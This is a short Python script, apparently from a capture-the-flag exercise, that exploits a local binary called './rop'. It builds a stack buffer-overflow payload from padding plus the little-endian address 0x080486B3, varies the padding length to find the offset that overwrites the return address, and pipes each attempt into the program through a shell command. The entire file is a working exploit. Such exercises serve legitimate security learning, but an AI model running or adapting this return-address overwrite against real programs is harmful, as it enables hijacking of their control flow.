import subprocess

addr = "080486B3"
addr_s = ''.join([chr(int(addr[2*i:2*i+2], 16)) for i in range(4)][::-1])

print(addr_s)
for i in range(20):
    s = "a" * 16 + "a" * 4 * i + addr_s
    cmd = 'printf "{}" | ./rop'.format(s)
    print(cmd)
    p = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
    ret = p.stdout.decode()
    print(ret)
